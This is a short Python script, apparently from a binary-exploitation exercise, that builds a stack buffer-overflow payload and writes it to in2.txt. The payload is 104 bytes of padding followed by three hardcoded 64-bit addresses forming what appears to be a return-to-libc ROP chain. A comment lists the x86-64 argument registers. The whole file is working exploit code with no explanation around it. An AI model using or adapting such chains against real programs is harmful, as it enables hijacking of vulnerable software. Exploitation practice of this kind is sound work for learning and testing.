#!/usr/bin/env python
from struct import *

buf = ""
buf += "A"*104
buf += pack("<Q", 0x000000000040122b)
buf += pack("<Q", 0x40203f)
buf += pack("<Q", 0x7ffff7e30ff0)

f = open("in2.txt", "w")
f.write(buf)

# rdi, rsi, rdx, rcx, r8, r9